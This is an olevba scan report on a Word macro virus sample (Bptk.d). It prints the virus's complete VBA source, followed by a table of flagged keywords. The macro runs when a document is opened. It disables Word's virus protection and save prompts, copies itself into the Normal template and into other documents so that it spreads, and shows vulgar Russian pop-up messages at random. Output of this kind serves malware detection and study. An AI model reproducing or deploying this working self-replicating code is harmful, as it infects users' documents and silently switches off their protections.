olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bptk.d-60e5a53d7c454be3689bf932f74a955790f9e65f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bptk.d-60e5a53d7c454be3689bf932f74a955790f9e65f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'D
'
'
On Error Resume Next
Application.EnableCancelKey = 0
With Options:
.ConfirmConversions = 0
.SaveNormalPrompt = 0
.VirusProtection = 0
End With
Set N = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set A = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
If N.Lines(4, 1) <> "'" Then
N.DeleteLines 1, N.CountOfLines
N.AddFromstring A.Lines(1, A.CountOfLines)
NormalTemplate.Save
GoTo 30
ElseIf A.Lines(4, 1) <> "'" Then
A.DeleteLines 1, A.CountOfLines
A.AddFromstring N.Lines(1, N.CountOfLines)
ActiveDocument.Save
End If
Randomize
If Rnd < 0.2 Then
MsgBox "Я е..лся с этой кнопкой,"
MsgBox "Ты е..ись понажимай !"
GoTo 20
End If
If Rnd < 0.1 Then
MsgBox "Как я ё..ся с этой кнопкой,"
MsgBox "Пое..ись теперь и ты !"
End If
20 If Rnd < 0.1 Then MsgBox "John  БГТУ  Брянск 2001 г. (в ответ БПТКам)": GoTo 30
30 End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

